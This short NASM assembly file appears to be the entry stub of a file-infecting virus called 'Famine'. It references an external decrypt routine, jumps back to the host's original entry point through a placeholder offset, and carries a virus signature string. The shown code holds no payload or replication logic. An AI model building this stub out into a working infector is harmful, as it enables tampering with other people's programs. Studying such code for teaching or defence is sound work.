BITS 64
default rel

extern decrypt
global _start

%define OEP_DELTA     0xDEADBEEF

section .text
_start:
    mov rbx, rdx
    cld

    ; --- restore rdx, jmp OEP ---
    mov rdx, rbx
    db 0xE9
    dd OEP_DELTA

section .rodata
msg:
    db "Famine version 1.0 (c)oded by <tde-cama>-<knerini>", 0x0a
msg_len equ $ - msg